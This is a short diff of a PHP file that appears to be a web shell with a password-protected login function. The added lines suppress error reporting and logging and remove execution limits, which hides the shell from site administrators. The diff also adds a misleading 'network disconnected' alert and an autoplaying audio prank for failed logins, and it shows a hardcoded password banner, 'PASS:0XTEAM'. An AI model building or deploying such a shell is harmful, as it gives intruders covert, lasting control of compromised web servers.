@@ -1,4 +1,11 @@
 <?php
+error_reporting(0);
+@clearstatcache();
+@ini_set("error_log", null);
+@ini_set("log_errors", 0);
+@ini_set("max_execution_time", 0);
+@ini_set("output_buffering", 0);
+@ini_set("display_errors", 0);
 session_start();
 
 function getURL($url) {
@@ -98,7 +105,7 @@ function login_shell() {
             exit;
         } else {
             // Incorrect password, trigger popup
-            echo "<script>alert('WHAT ARE YOU DOING BITCH !');</script>";
+            echo "<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mpeg"></audio><script>alert('Jaringan Terputus!');</script>";
         }
     }
 
@@ -177,7 +184,7 @@ function login_shell() {
       
 
 
-.: LOGIN ADMINISTRATOR :.
+PASS:0XTEAM
     </pre>
 </header>
 <form method="post">
